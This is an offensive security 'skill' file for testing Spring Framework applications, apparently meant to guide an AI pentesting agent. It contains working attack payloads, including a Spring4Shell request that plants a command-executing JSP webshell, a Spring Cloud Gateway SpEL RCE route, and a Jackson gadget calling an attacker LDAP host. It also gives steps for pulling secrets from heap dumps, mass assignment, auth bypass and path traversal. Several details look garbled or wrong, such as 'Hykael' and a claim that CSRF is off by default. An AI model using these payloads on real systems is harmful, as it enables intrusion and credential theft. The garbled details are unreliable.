---
name: spring
description: Spring Framework security testing covering Spring4Shell / SpringShell, SpEL injection, Actuator exposure, Spring Security misconfig, deserialization via Jackson, and Spring Boot admin endpoints
---

# Spring Framework

Spring is the dominant Java framework. The Spring ecosystem is large (Spring MVC, Spring Boot, Spring Security, Spring Data, Spring Cloud, Spring Integration) and the vuln surface is correspondingly large. Most Spring vulns fall into: SpEL injection (Spring Expression Language), Spring4Shell-style RCEs, Actuator endpoint exposure, deserialization via Spring's Jackson defaults, Spring Security misconfig, and the broad class of Java deserialization bugs (see `deserialization` skill).

**For language-level Java deserialization (ysoserial, Jackson polymorphic, XStream, SnakeYAML, FastJson), see the `deserialization` skill. This skill covers Spring-specific patterns.**

## Attack Surface

**Core Surfaces**
- `@Controller` / `@RestController` — request handlers
- `@RequestMapping`, `@GetMapping`, etc. — URL routing
- `@RequestParam`, `@PathVariable`, `@RequestBody` — parameter binding
- `@ModelAttribute` — bean binding (mass assignment)
- `@ResponseBody`, `@RestController` — JSON response
- `@ExceptionHandler`, `@ControllerAdvice` — global error handling
- `@RequestScope`, `@SessionScope`, `@ApplicationScope` — bean scopes
- `HttpServletRequest`, `HttpServletResponse` — direct servlet access
- `WebDataBinder` — type conversion, validators
- `HandlerInterceptor` — pre/post handlers (auth, CORS)
- `Filter` — global filters (Spring Security, character encoding)
- `HandlerMethodArgumentResolver` — custom argument resolution

**Spring Boot**
- `application.properties` / `application.yml` — config
- Auto-configuration: Spring Boot configures many things by default
- Spring Boot Starter packages: `spring-boot-starter-web`, `spring-boot-starter-data-jpa`, `spring-boot-starter-security`, `spring-boot-starter-actuator`
- DevTools (`spring-boot-devtools`) — auto-restart in dev, exposes `/env` and `/restart`
- Spring Boot CLI — for Groovy scripts

**Spring Security**
- `WebSecurityConfigurerAdapter` (deprecated in 5.7+, replaced by `SecurityFilterChain` bean)
- `@EnableWebSecurity`, `@EnableGlobalMethodSecurity`
- `@PreAuthorize`, `@PostAuthorize`, `@Secured` — method security
- `AuthenticationManager`, `AuthenticationProvider`, `UserDetailsService`
- `BCryptPasswordEncoder`, `SCryptPasswordEncoder`, `Argon2PasswordEncoder`
- `SecurityContextHolder` — thread-local auth state
- `CsrfTokenRepository`, `CookieCsrfTokenRepository`
- OAuth2 resource server / client (JWT, opaque tokens)
- SAML2 (Spring Security 5.2+)
- CORS: `CorsConfigurationSource` / `@CrossOrigin`

**Spring Data**
- `JpaRepository`, `MongoRepository`, `CrudRepository`
- `@Query` (JPQL/native) — query definition
- `Specification` — dynamic query building
- `Querydsl` — type-safe queries
- `Pageable` — pagination, sort
- `findBy...` derived queries — auto-generated
- `EntityManager` — direct JPA access
- `NamedParameterJdbcTemplate` — raw SQL with named params

**Spring Cloud**
- Eureka service registry
- Config Server (centralized config)
- Gateway (Spring Cloud Gateway — SpEL injection CVE-2022-22947)
- Hykael (circuit breaker, deprecated)
- OpenFeign (HTTP client)
- Sleuth / Zipkin (tracing)

**Spring Integration / Spring AMQP**
- Message channels, transformers
- SpEL in routing expressions
- `IntegrationFlow`

## Reconnaissance

**Server identification**
- `Server: Apache-Coyote/1.1` (default Spring Boot embedded Tomcat)
- 404 page: `{"timestamp":"2025-01-01T00:00:00.000+00:00","status":404,"error":"Not Found","path":"/unknown"}` (Spring Boot default error JSON)
- `X-Application-Context: application:8080` (older Spring Boot, header disclosure)
- 500 page: full stack trace with `org.springframework.web.bind...`
- Whitelabel error page: `Whitelabel Error Page` + JSON details
- `JSESSIONID` cookie (Tomcat session)
- `XSRF-TOKEN` cookie (Spring Security CSRF)

**Actuator endpoints (the recon goldmine):**
- `/actuator` — root
- `/actuator/env` — env vars, properties, config (may include DB creds, AWS creds, OAuth secrets)
- `/actuator/beans` — all Spring beans
- `/actuator/mappings` — all URL mappings (full route map)
- `/actuator/configprops` — `@ConfigurationProperties`
- `/actuator/health` — health check
- `/actuator/info` — git info, build info
- `/actuator/metrics` — Prometheus metrics
- `/actuator/loggers` — change log levels at runtime
- `/actuator/threaddump` — thread dump
- `/actuator/heapdump` — heap dump (download file, analyze with MAT/VisualVM) — contains ALL in-memory secrets
- `/actuator/jolokia` — JMX over HTTP
- `/actuator/httptrace` — last 100 HTTP requests (full headers, bodies, sessions)
- `/actuator/caches`, `/actuator/conditions`, `/actuator/scheduledtasks`

**Version detection**
- `pom.xml` / `build.gradle` in source
- `MANIFEST.MF` in JAR
- `org.springframework.web.servlet.DispatcherServlet` version in error pages
- Spring Boot version: `/actuator/info` → `build.version`

**Hidden endpoints**
- `/swagger-ui.html`, `/swagger-ui/`, `/v3/api-docs` (Springdoc OpenAPI)
- `/v2/api-docs` (Springfox)
- `/graphql` (if GraphQL starter)
- `/h2-console` (H2 database, often in dev)
- `/admin` (custom)
- `/webjars/` (static resources for Spring jars)

## Key Vulnerabilities

### Spring4Shell / SpringShell (CVE-2022-22965) — RCE

**Pre-reqs:**
- Spring MVC + Spring WebFlux
- Java 9+ (or specific older versions)
- WAR deployment on Tomcat (the most common path)
- `spring-param` parsing enabled
- `DataBinder` default behavior

**The exploit:**
1. Modify Tomcat logging config via class loader access
2. Write a webshell to a known location
3. Trigger the webshell

**CVE-2022-22965 payload (truncated):**
```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

**Vulnerable versions:** Spring Framework < 5.3.18, < 5.2.20 (patched April 2022).

**CVE-2022-22963** (SpEL RCE via `@RequestParam` when binding to plain objects) — separate bug, related.

### Spring Cloud Gateway SpEL Injection (CVE-2022-22947)

**Pre-reqs:** Spring Cloud Gateway < 3.1.1+ / 3.0.7+ with enabled + exposed routes.

**Payload:**
```http
POST /actuator/gateway/routes/hacktest HTTP/1.1
Content-Type: application/json

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "X-Test",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "order": 0
}
```
Then: `POST /actuator/gateway/refresh` (need admin access to actuator)
Then: `GET /actuator/gateway/routes/hacktest` — triggers the SpEL evaluation
Or: `POST /actuator/gateway/refresh` then send any request through the gateway

### Spring Data MongoDB SpEL Injection (CVE-2022-22980)

**Pre-reqs:** Spring Data MongoDB with `@Query` and SpEL.

**Payload:**
```http
GET /?username=admin'||1||' HTTP/1.1
// Or: ?username[$ne]=null
```

If the query is `db.users.find({username: ?#{[0]}})` and the value is `admin'||1||'`, SpEL evaluates to a Boolean expression. Can be chained to RCE.

### Actuator Endpoint Exposure (CRITICAL)

**Default Spring Boot 1.x: ALL endpoints exposed via `/`**
- `/env`, `/beans`, `/mappings`, `/heapdump`, `/httptrace`, `/jolokia`

**Spring Boot 2.x+: only `/health`, `/info` exposed by default**

**`application.properties` to check:**
```properties
# 2.x default — these are exposed
management.endpoints.web.exposure.include=health,info
# 1.x default — these are all exposed
management.endpoints.web.exposure.include=*
# Sometimes explicitly set
management.endpoints.web.exposure.include=*
management.endpoint.env.enabled=true
management.endpoint.heapdump.enabled=true
```

**`/actuator/heapdump` is the most dangerous:**
- Downloads the entire JVM heap
- Extract secrets: DB passwords, OAuth tokens, JWT keys, in-memory session data
- Use Eclipse MAT, VisualVM, or `strings heapdump.bin | grep -iE "password|secret|token|key"`
- Or use `JDumpSpider` (Tool) for fast extraction

**`/actuator/env` leaks:**
- All `@ConfigurationProperties` (DB URLs, AWS creds, OAuth secrets)
- All environment variables
- `eureka.client.serviceUrl.defaultZone` (Eureka service registry)
- `spring.datasource.username`, `spring.datasource.password`
- `spring.security.user.name`, `spring.security.user.password`
- `aws.accessKey`, `aws.secretKey`
- Custom config: `app.stripe.secret`, `app.jwt.signing-key`, etc.

**`/actuator/mappings` leaks:**
- Complete URL map → recon for all endpoints, including admin-only ones

**`/actuator/httptrace` leaks:**
- Last 100 HTTP requests with headers, bodies, sessions, principal
- Auth tokens, session cookies, CSRF tokens visible

**`/actuator/loggers` enables runtime log level changes:**
- POST `/actuator/loggers/org.springframework` with `{"configuredLevel":"DEBUG"}` — see more verbose output

**`/actuator/jolokia` (JMX over HTTP):**
- Access JMX MBeans via REST
- `MBeanServer` operations, can change runtime config
- Read environment via `java.lang:type=Runtime` → `SystemProperties`
- `org.apache.tomcat:*` MBeans allow modifying JNDI data sources

### Spring Security Misconfigurations

**CSRF disabled by default in many configs:**
```java
// VULNERABLE: CSRF disabled
http.csrf().disable();
// Or: extends WebSecurityConfigurerAdapter without overriding
```

**Spring Security 5.7+ default — CSRF disabled unless explicitly enabled.**

**Auth bypass via path patterns:**
```java
http.authorizeRequests()
    .antMatchers("/admin/**").authenticated()  // ← requires auth
    .anyRequest().permitAll();
// VULNERABLE: /Admin or /admin/ or /admin;jsessionid=...
```

**Bypass techniques:**
- `/admin/../admin` — path normalization
- `/admin` (no trailing slash) vs `/admin/`
- `/Admin` (case) — depends on servlet container
- `/admin;.jsessionid=...` — Tomcat bypass
- URL-encoded: `/%61dmin`
- Spring's `antMatchers` vs `mvcMatchers` differences

**`@PreAuthorize` missing on service methods:**
- Controller has `@PreAuthorize` but service is unprotected
- Direct service invocation via Actuator endpoints or internal calls

**Default Spring Security password:**
- `spring.security.user.name=user`
- `spring.security.user.password=<UUID generated at startup>`
- UUID is logged in startup output → /actuator/loggers or log file access
- Default user has role `USER` — low privilege, but can be admin if misconfig

**JWT validation in Spring Security:**
- `oauth2ResourceServer().jwt()` — uses `JwtDecoder` (default: `NimbusJwtDecoder`)
- Algorithm not restricted → alg confusion (see `jwt_tool` skill)
- `secretKey` configured but `algorithms` not specified

**OAuth2 client misconfig:**
- Spring Security OAuth2 client — `redirect_uri` validation
- Same OAuth2 bugs as `oauth2_oidc` skill

**CORS in Spring Security:**
- `@CrossOrigin(origins = "*")` — open CORS
- `CorsConfiguration.addAllowedOrigin("*")` — open CORS
- `allowCredentials(true)` + `allowedOrigin("*")` — Spring rejects this combo, but with `allowedOriginPattern` it works

**Missing method security:**
- `@EnableGlobalMethodSecurity(prePostEnabled = true)` not set
- Service methods can be called without role checks

### Mass Assignment via @ModelAttribute

**Spring MVC's `@ModelAttribute` binds form fields to a Java bean:**
```java
// VULNERABLE
@PostMapping("/users")
public String createUser(@ModelAttribute User user) {
    userRepository.save(user);
    return "redirect:/users";
}
// User class has: id, name, email, isAdmin, passwordHash, role
// Form: name=attacker&email=a@b.c&isAdmin=true
// → user is created with isAdmin=true
```

**Test:**
```bash
curl -X POST https://target.com/users \
  -d "name=attacker&email=a@b.c&isAdmin=true&role=admin"
# Or JSON:
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "attacker", "email": "a@b.c", "isAdmin": true}'
```

**Spring Data REST** (auto-generates REST APIs from `@Entity`):
- `POST /users` with `isAdmin: true` in body → mass assignment
- Default `RepositoryRestConfiguration` exposes entities via REST

**Detection:**
```bash
grep -rn "@ModelAttribute\|@RequestBody" --include="*.java" src/main/java/
```

### SpEL Injection

**SpEL in annotations:**
```java
@PreAuthorize("hasRole('" + userInput + "')")  // VULNERABLE (if userInput is in expression)
// Or: @PreAuthorize("#userId == authentication.principal.id")  // secure
```

**SpEL in `@Value`:**
```java
@Value("#{systemProperties['user.dir']}")
private String path;
```

**SpEL in `@RequestMapping`:**
```java
@RequestMapping(value = "/${someProperty}")  // SpEL-like
```

**SpEL in `@Cacheable`:**
```java
@Cacheable(value = "#user.role + '-data'")  // expression in cache name
```

**Test:**
```bash
# If a controller reads user input into a SpEL expression:
# Spring Cloud Gateway CVE-2022-22947 payload above
# Or custom SpEL usage
```

### SQL Injection

**JPA/JPQL with user input:**
```java
// VULNERABLE
@Query("SELECT u FROM User u WHERE u.name = '" + name + "'")
List<User> findByName(String name);

// SECURE
@Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByName(@Param("name") String name);
```

**Native queries:**
```java
// VULNERABLE
@Query(value = "SELECT * FROM users WHERE name = '" + name + "'", nativeQuery = true)

// SECURE
@Query(value = "SELECT * FROM users WHERE name = :name", nativeQuery = true)
```

**Criteria API:**
```java
// VULNERABLE — concat into criteria
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.select(root).where(cb.equal(root.get("name"), userInput));
// SECURE — this is parameterized
```

**`EntityManager.createNativeQuery`:**
```java
// VULNERABLE
em.createNativeQuery("SELECT * FROM users WHERE name = '" + name + "'");
// SECURE
em.createNativeQuery("SELECT * FROM users WHERE name = ?1").setParameter(1, name);
```

**`JdbcTemplate.query` with string concat:**
```java
// VULNERABLE
jdbcTemplate.query("SELECT * FROM users WHERE name = '" + name + "'", rowMapper);
// SECURE
jdbcTemplate.query("SELECT * FROM users WHERE name = ?", rowMapper, name);
```

### Deserialization (Jackson)

**Spring's default Jackson with `@RestController` accepts polymorphic JSON:**
```json
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```
**Vulnerable when `ObjectMapper.enableDefaultTyping()` is set** (older Spring Boot apps with custom config).

**Spring Boot's default Jackson is safe** (typing is not enabled), but custom config may enable it.

**CVE-2017-8046** (Spring Data REST) — SpEL injection in path.
**CVE-2018-1273** (Spring Data Commons) — SpEL injection in property paths.
**CVE-2018-1275** (Spring Security) — `MvcRequestMatcher` path confusion.
**CVE-2018-1260** (Spring Security OAuth2) — `redirect_uri` bypass.

### Spring Cloud / Microservices

**Spring Cloud Config Server** (CVE-2019-3799, CVE-2020-5403):
- Path traversal in resource loading
- `spring-cloud-config` < 2.1.6, 2.2.x < 2.2.3
- Payload: `/..%2F..%2Fetc/passwd` style traversal

**Eureka / service registry:**
- Default no auth — anyone can register services
- Service spoofing: register your own `accounts-service` with malicious implementation
- `eureka.client.serviceUrl.defaultZone=http://attacker.com/eureka` (if env controllable)

**Spring Cloud Gateway** — see CVE-2022-22947 above

**Spring Cloud Sleuth:**
- Trace ID in response headers (X-B3-TraceId)
- May leak user data via `executionContext`

### Spring Boot DevTools

**DevTools in production** (CVE-2023-46574):
- Exposes `/env` and other Actuator endpoints by default
- `/restart` endpoint — restart the app
- `/restart` may not be auth-required if DevTools is on
- Restart with `POST /restart` → app goes down briefly → DoS

**Test:**
```bash
curl -X POST https://target.com/restart
# Or:
curl -X POST https://target.com/actuator/restart
```

### Static Resource Serving

**Spring's `ResourceHttpRequestHandler` (used by `mvc:resources`):**
- Default: no directory traversal
- But custom config may allow it
- Test: `curl https://target.com/static/..%2F..%2Fetc%2Fpasswd`

**`file:./public/` vs `classpath:/public/`:**
- `classpath:` — limited to JAR contents
- `file:` — actual filesystem, may leak secrets
- Some apps misconfigure

### H2 Database Console (Development Default)

**H2 console** is often exposed in dev with no auth:
- `/h2-console` → JDBC URL input
- If app is in dev mode (or `spring.h2.console.enabled=true` in prod)
- Connect to local H2 DB, read/write all data
- JDBC URL: `jdbc:h2:mem:testdb` or `jdbc:h2:~/test` (file)

**Test:**
```bash
curl https://target.com/h2-console
# If login page appears, the console is exposed
```

## Common Spring CVEs (2024-2025)

- **CVE-2024-22243** — Spring Framework `UriComponentsBuilder` SSRF
- **CVE-2024-22257** — Spring Framework `UriComponentsBuilder` open redirect
- **CVE-2024-22259** — Spring Framework `UriComponentsBuilder` URL parsing
- **CVE-2024-22262** — Spring Framework HTTP request smuggling via `Content-Length` parsing
- **CVE-2024-37050** — Spring AI Elasticsearch vector store SQLi
- **CVE-2024-38821** — Spring WebFlux method security bypass
- **CVE-2024-38816** — Spring WebFlux `WebFlux.fn` path matching bypass
- **CVE-2025-XXXXX** — check current

Run: `cve_lookup(query="spring", product="spring", is_kev=True, sort_by_epss=True)`

## Common Bypass Techniques

**`/actuator` auth bypass:**
- Behind a reverse proxy that strips `/actuator` prefix
- Internal-only IP allowlist with spoofable `X-Forwarded-For`
- CORS allows `*` for Actuator endpoints (rare but seen)

**CSRF bypass in Spring Security:**
- `CookieCsrfTokenRepository.withHttpOnlyFalse()` — JS can read token
- Missing `CookieCsrfTokenRepository` entirely
- Custom CSRF check that allows `X-CSRF-TOKEN` header without proper comparison

**`@PreAuthorize` SpEL injection:**
- If expression is built from user input
- E.g., `hasRole('" + role + "')` with user-controlled `role`

**Spring Security OAuth2 algorithm confusion:**
- `JwtDecoders.fromIssuerLocation(issuer)` — no `algorithms` set
- Default decoders are vulnerable to alg confusion

**Default Spring Boot error JSON leaks class names:**
- 500 error → JSON with `message: "..."`, `trace: "..."` (if `server.error.include-stacktrace=always`)
- Default in Spring Boot 2.3+: `never` — but some apps override

## Testing Methodology

1. **Fingerprint** — Spring version, Spring Boot version, Actuator endpoints exposed
2. **Map Actuator** — `/actuator`, `/actuator/env`, `/actuator/mappings`, `/actuator/heapdump`
3. **Download heap dump** — analyze for secrets
4. **Map URL routes** — `/actuator/mappings` or fuzzing
5. **Test Actuator config** — `/actuator/env` for env vars, `/actuator/configprops` for `@ConfigurationProperties`
6. **Test Actuator loggers** — change log level to DEBUG, see more output
7. **Test Actuator httptrace** — see recent requests with auth headers
8. **Test Actuator restart** — `POST /actuator/restart` (DoS)
9. **Test Spring Security** — auth bypass via path, CSRF missing, method security
10. **Test mass assignment** — `@ModelAttribute` or `@RequestBody` with extra fields
11. **Test SQL injection** — `@Query` with concat, native queries, `EntityManager.createNativeQuery`
12. **Test SpEL injection** — Spring Cloud Gateway, custom SpEL in `@PreAuthorize` or `@Value`
13. **Test deserialization** — Jackson polymorphic, ysoserial payloads
14. **Test Spring Cloud** — Config Server, Gateway, Eureka

## Validation Requirements

- **Actuator exposure**: GET `/actuator/env`, show DB creds / AWS creds / JWT signing key in response
- **Heap dump extraction**: download `/actuator/heapdump`, extract a secret with `strings | grep`
- **Spring4Shell**: write a webshell via class loader, get RCE
- **Spring Cloud Gateway SpEL**: change routing to execute `id` command, see output
- **Mass assignment**: create user with `isAdmin=true`, log in as that user, see admin UI
- **SQLi**: `UNION SELECT` or time-based blind, show data extraction
- **CSRF bypass**: state-changing GET or POST without CSRF token succeeds
- **Auth bypass**: hit `/admin/...` without auth, get 200
- **Path traversal**: `ResourceHttpRequestHandler` reads `/etc/passwd`

## False Positives

- Actuator endpoints are exposed but require authentication (e.g., behind Spring Security)
- `/actuator/env` shows config but it's all internal IP addresses / non-sensitive
- Heap dump contains only ephemeral session data
- Spring Security path patterns are `mvcMatchers` (matched after path normalization) — more secure
- `@PreAuthorize` is on the service, not controller — already enforced
- Mass assignment blocked by `@InitBinder` `setDisallowedFields("id", "isAdmin", ...)`
- SpEL expression looks suspicious but is parameterized (`#{T(java.lang.Runtime).getRuntime().exec('id' + username)}` — concat IS user input, but the actual eval is parameterized)
- SQLi: `@Query` is using `:param` style — parameterized
- `@RequestBody` with `isAdmin` field but DTO has `isAdmin` field marked as read-only

## Impact

- **Critical**: Actuator `/actuator/heapdump` → all secrets, including in-memory tokens
- **Critical**: Spring4Shell → RCE
- **Critical**: Spring Cloud Gateway SpEL → RCE via route config
- **Critical**: Actuator `/actuator/env` with cloud creds → full cloud account compromise
- **High**: Mass assignment to admin → full ATO
- **High**: SQLi → DB compromise
- **High**: Spring Security auth bypass → admin endpoints accessible
- **Medium**: CSRF missing on state-changing endpoints
- **Chain**: Actuator env → DB creds → DB compromise → all user data
- **Chain**: Spring Cloud Gateway SpEL → RCE → service mesh pivot

## Cross-References

- **`deserialization` skill** — Java serialization, ysoserial, Jackson polymorphic
- **`sql_injection` skill** — JPA / Hibernate / native queries
- **`cors_misconfiguration` skill** — Spring CORS
- **`jwt_tool` skill** — Spring Security OAuth2 JWT validation
- **`oauth2_oidc` skill** — Spring Security OAuth2 client / resource server
- **`rce` skill** — SpEL injection, Spring4Shell
- **`ssrf` skill** — Spring `UriComponentsBuilder` SSRF (CVE-2024-22243)
- **`cve_lookup` tool** — current Spring CVEs

## Tooling Checklist

- **ysoserial** — Java gadget chain generator
- **JDumpSpider** — heap dump analysis tool (fast secret extraction)
- **spring-boot-actuator-exploit** (Nuclei templates)
- **semgrep** with `p/java` and `p/spring` rules
- **find-sec-bugs** (SpotBugs plugin)
- **OWASP Dependency-Check** — vulnerable Spring dependencies
- **nuclei** — Spring4Shell, Spring Cloud Gateway SpEL templates
- **Proxy tools** for replaying Actuator requests
- **interactsh** for OOB SSRF / SpEL confirmation
- **JDK tools**: `jhat`, `jmap`, `jstack` for heap/thread analysis
